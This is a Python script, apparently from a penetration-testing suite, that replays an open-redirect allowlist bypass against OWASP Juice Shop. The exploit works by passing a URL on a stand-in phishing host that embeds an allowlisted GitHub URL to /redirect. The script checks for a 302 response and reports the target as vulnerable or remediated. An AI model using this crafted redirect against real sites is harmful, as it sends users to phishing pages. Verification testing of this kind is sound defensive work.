#!/usr/bin/env python3
"""pt33: the redirect allowlist checks url.includes(allowedUrl), not
whether the URL actually starts with (or is hosted at) an allowed
origin, so any attacker-controlled URL that merely contains an
allowlisted string anywhere in it passes.

Found white-box via the challenge catalog (redirectChallenge,
"Allowlist Bypass"). lib/insecurity.ts's isRedirectAllowed:

    for (const allowedUrl of redirectAllowlist) {
      allowed = allowed || url.includes(allowedUrl)
    }

Confirmed live: GET /redirect?to=<attacker-domain>/phish?x=<allowlisted
URL> returned a real HTTP 302 with Location pointing at the
attacker-controlled domain, not the allowlisted one.

Standard library only (urllib).
"""

from __future__ import annotations

import argparse
import json
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent.parent))
import ledger  # noqa: E402

DEFAULT_BLUEPRINT = Path(__file__).resolve().parent / "blueprints" / "pt33-001.json"
ALLOWLISTED_URL = "https://github.com/juice-shop/juice-shop"
ATTACKER_HOST = "https://flatline-pt33-phish.test"


def _redirect_location(target: str, to_url: str) -> tuple[int | None, str | None]:
    encoded = urllib.parse.quote(to_url, safe="")
    req = urllib.request.Request(f"{target}/redirect?to={encoded}", method="GET")
    opener = urllib.request.build_opener(urllib.request.HTTPRedirectHandler)

    class _NoRedirect(urllib.request.HTTPErrorProcessor):
        def http_response(self, request, response):
            return response

        https_response = http_response

    opener = urllib.request.build_opener(_NoRedirect)
    try:
        resp = opener.open(req, timeout=10)
        return resp.status, resp.headers.get("Location")
    except urllib.error.HTTPError as exc:
        return exc.code, exc.headers.get("Location")


def run(target: str, blueprint: dict) -> dict:
    ledger.guard_target_host(target)

    crafted_url = f"{ATTACKER_HOST}/phish?x={ALLOWLISTED_URL}"
    exploit_status, exploit_location = _redirect_location(target, crafted_url)
    redirected_to_attacker = exploit_status == 302 and bool(exploit_location) and exploit_location.startswith(ATTACKER_HOST)

    if exploit_status == 302 and redirected_to_attacker:
        status = "VULNERABLE"
        summary = f"A crafted URL on an attacker-controlled host that merely contains an allowlisted string was followed with a real 302 to {exploit_location}."
    elif exploit_status == 406:
        status = "REMEDIATED"
        summary = "The crafted URL was rejected (HTTP 406): it does not actually start with any allowlisted origin."
    else:
        status = "ERROR"
        summary = f"Inconclusive: exploit_status={exploit_status}, exploit_location={exploit_location}."

    legit_status, legit_location = _redirect_location(target, ALLOWLISTED_URL)
    legitimate_allowlisted_redirect_ok = legit_status == 302 and legit_location == ALLOWLISTED_URL

    return {
        "vulnerability_id": blueprint["vulnerability_id"],
        "mitre_technique": blueprint["mitre_technique"],
        "target": target,
        "status": status,
        "exploit_http_status": exploit_status,
        "exploit_location": exploit_location,
        "summary": summary,
        "legitimate_allowlisted_redirect_ok": legitimate_allowlisted_redirect_ok,
    }


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--blueprint", default=str(DEFAULT_BLUEPRINT))
    parser.add_argument("--target", default=None, help="Overrides the blueprint's target.host, e.g. to point at the proxy instead.")
    args = parser.parse_args()

    blueprint = json.loads(Path(args.blueprint).read_text())
    target = args.target or blueprint["target"]["host"]

    result = run(target, blueprint)
    print(json.dumps(result, indent=2))

    results_dir = Path(__file__).resolve().parent / "results"
    results_dir.mkdir(exist_ok=True)
    out_path = results_dir / f"{result['vulnerability_id']}-{int(time.time())}.json"
    out_path.write_text(json.dumps(result, indent=2))

    ledger._append_log({"event": "replay_run", "item": "pt33-open-redirect-allowlist-bypass", **result})

    if result["status"] == "ERROR":
        sys.exit(2)


if __name__ == "__main__":
    main()
